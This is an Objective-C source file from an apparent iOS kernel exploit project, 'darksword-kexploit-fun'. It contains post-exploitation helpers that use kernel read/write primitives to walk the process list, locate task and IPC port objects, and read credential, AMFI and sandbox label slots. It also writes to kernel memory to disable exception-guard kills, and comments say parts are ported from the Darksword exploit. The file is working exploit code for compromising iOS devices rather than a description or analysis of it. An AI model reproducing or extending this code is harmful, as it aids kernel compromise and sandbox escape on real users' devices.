//
//  kutils.m
//  darksword-kexploit-fun
//
//  Created by seo on 3/25/26.
//

#import "kutils.h"
#import "kexploit_opa334.h"
#import "krw.h"
#import "offsets.h"
#import <unistd.h>
#import <string.h>
#import <stdbool.h>
#import <sys/mount.h>
#import <Foundation/Foundation.h>

extern bool gIsPACSupported;
extern uint64_t rwSocketPcb;

uint64_t gSelfProc = 0;
uint64_t gSelfTask = 0;

uint64_t proc_self(void) {
    if(!gSelfProc) {
        uint64_t rwSocketAddr = kread64(rwSocketPcb + off_inpcb_inp_socket);
        uint64_t current_thread = kread64(rwSocketAddr + off_socket_so_background_thread);
        uint64_t current_thread_ro = kread64(current_thread + off_thread_t_tro);
        gSelfProc = kread64(current_thread_ro + off_thread_ro_tro_proc);
    }
    return gSelfProc;
}

uint64_t task_self(void) {
    if(!gSelfTask) {
        uint64_t rwSocketAddr = kread64(rwSocketPcb + off_inpcb_inp_socket);
        uint64_t current_thread = kread64(rwSocketAddr + off_socket_so_background_thread);
        uint64_t current_thread_ro = kread64(current_thread + off_thread_t_tro);
        gSelfTask = kread64(current_thread_ro + off_thread_ro_tro_task);
    }
    return gSelfTask;
}

uint64_t proc_find(pid_t pid) {
    uint64_t proc = proc_self();
    while (1) {
        uint32_t curPid = kread32(proc + off_proc_p_pid);
        if (curPid == pid)
            return proc;
        proc = kread64(proc + off_proc_p_list_le_next);
        if(!proc) break;
    }
    
    proc = proc_self();
    while (1) {
        uint32_t curPid = kread32(proc + off_proc_p_pid);
        if (curPid == pid)
            return proc;
        proc = kread64(proc + off_proc_p_list_le_prev);
        if(!proc) return -1;    // not found
    }
    
    return proc;
}

uint64_t proc_find_by_name(const char* name) {
    uint64_t proc = proc_self();
    while (1) {
        char *p_name = proc_get_p_name(proc);
        if(p_name != NULL && strcmp(p_name, name) == 0)
            return proc;
        proc = kread64(proc + off_proc_p_list_le_next);
        if(!proc) break;
    }
    
    proc = proc_self();
    while (1) {
        char *p_name = proc_get_p_name(proc);
        if(p_name != NULL && strcmp(p_name, name) == 0)
            return proc;
        proc = kread64(proc + off_proc_p_list_le_prev);
        if(!proc) return -1;    // not found
    }
    
    return proc;
}

char proc_name[32];
char* proc_get_p_name(uint64_t proc) {
    if(!proc)   return NULL;
    memset(proc_name, 0, 32);
    kreadbuf(proc + off_proc_p_name, &proc_name, 32);
    return proc_name;
}

uint64_t proc_task(uint64_t proc)
{
    uint64_t p_proc_ro = kread64(proc + off_proc_p_proc_ro);
    uint64_t pr_task = kread64(p_proc_ro + off_proc_ro_pr_task);
    return pr_task;
}

uint64_t ipc_entry_lookup(uint64_t space, mach_port_name_t name)
{
    // New format in iOS 16.1
    uint64_t table = kread_smrptr(space + off_ipc_space_is_table);
    // Temporary FIX:
    // It seems like only problem occured when arm64 devices (especially iPad 7/17.0)
    // When tried running without below if code block, it still works fine on iPhone SE2/17.0, SE3/18.6.2
    // If code blocks running on iPad M4/26.0.x, it occured problems.
    if(!gIsPACSupported) {
        table |= 0xFFFFFF8000000000ULL;
        table = kalloc_array_decode(table);
    }

    return (table + (sizeof_ipc_entry * (name >> 8)));
}

uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port)
{
    uint64_t itk_space = kread_ptr(task + off_task_itk_space);
    return ipc_entry_lookup(itk_space, port);
}

uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port)
{
    return kread_ptr(task_get_ipc_port_table_entry(task, port) + off_ipc_entry_ie_object);
}

uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port)
{
    return kread_ptr(task_get_ipc_port_object(task, port) + off_ipc_port_ip_kobject);
}

uint64_t task_get_vm_map(uint64_t task_ptr)
{
    return kread_ptr(task_ptr + off_task_map);
}

uint64_t thread_get_t_tro(uint64_t thread) {
    return kread64(thread + off_thread_t_tro);
}

// from pe_main.js
int disable_excguard_kill(uint64_t task) {
    // in mach_port_guard_ast, the victim would crash if these are on.
    uint32_t excGuard = kread32(task + off_task_task_exc_guard);
    excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
    excGuard |= TASK_EXC_GUARD_MP_DELIVER;
    kwrite32(task + off_task_task_exc_guard, excGuard);
    
    return 0;
}

uint64_t thread_get_task(uint64_t thread)
{
    uint64_t tro = thread_get_t_tro(thread);
    return kread64(tro + off_thread_ro_tro_task);
}

uint16_t thread_get_options(uint64_t thread)
{
    return kread16(thread + off_thread_options);
}

void thread_set_options(uint64_t thread, uint16_t options) {
    kwrite16(thread + off_thread_options, options);
}

void thread_set_mutex(uint64_t thread, uint32_t ctid) {
    kwrite32(thread + off_thread_mutex_lck_mtx_data, ctid);
}

uint32_t thread_get_mutex(uint64_t thread) {
    return kread32(thread + off_thread_mutex_lck_mtx_data);
}

uint64_t thread_get_kstackptr(uint64_t thread) {
    return kread_ptr(thread + off_thread_machine_kstackptr);
}

uint64_t thread_get_jop_pid(uint64_t thread) {
    return kread64(thread + off_thread_machine_jop_pid);
}

uint64_t thread_get_rop_pid(uint64_t thread) {
    return kread64(thread + off_thread_machine_rop_pid);
}

const char* get_bootManifestHash(void) {
    struct statfs fs;
    if (statfs("/usr/standalone/firmware", &fs) == 0) {
        NSString *mountedPath = [NSString stringWithUTF8String:fs.f_mntfromname];
        NSArray<NSString *> *components = [mountedPath componentsSeparatedByString:@"/"];
        if ([components count] > 3) {
            NSString *substring = components[3];
            return substring.UTF8String;
        }
    }
    return NULL;
}

uint64_t proc_get_cred_label(uint64_t proc) {
    uint64_t p_proc_ro = kread64(proc + off_proc_p_proc_ro);
    uint64_t ucred = kread64(p_proc_ro + off_proc_ro_p_ucred);
    uint64_t label = kread_ptr(ucred + off_ucred_cr_label);
    return label;
}

uint64_t amfi_cslot_get(uint64_t label) {
    return kread64(label + off_label_l_perpolicy_amfi);
}

uint64_t label_get_sandbox(uint64_t label) {
    return kread64(label + off_label_l_perpolicy_sandbox);
}

// from Darksword's libs/TaskRop/Task.js - static #kallocArrayDecodeAddr(ptr)
uint64_t kalloc_array_decode(uint64_t ptr)
{
    //xnu-10002.61.3/osfmk/kern/kalloc.c:2047
    uint64_t shift = 64 - t1sz_boot - 1;
    uint64_t zone_mask = 1ULL << shift;

    if (ptr & zone_mask) {
        ptr &= ~0x1FULL;
    } else {
        ptr &= ~0x3FFFULL;
        ptr |= zone_mask;
    }
    return ptr;
}

